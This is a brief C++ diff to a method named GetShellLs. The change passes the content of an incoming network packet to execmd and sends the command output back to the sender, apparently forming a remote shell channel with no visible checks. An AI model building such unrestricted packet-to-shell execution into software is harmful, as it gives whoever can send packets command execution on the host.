@@ -299,8 +299,8 @@ public:
 	int GetShellLs(){
 		char path[MLHT_MAX_LENGTH] = {0};
 		//if(ListDir((char *)p_get->GetPacketContent(),path))
-		if(execmd(path))
-		{   printf("%s",path);
+		if(execmd((char *)p_get->GetPacketContent(),path))
+		{   //printf("%s",path);
 			return SendPacket(MLHT_MTU_TYPE_SHELL_LS,1,1,path,strlen(path)+1);
 		}
 		else
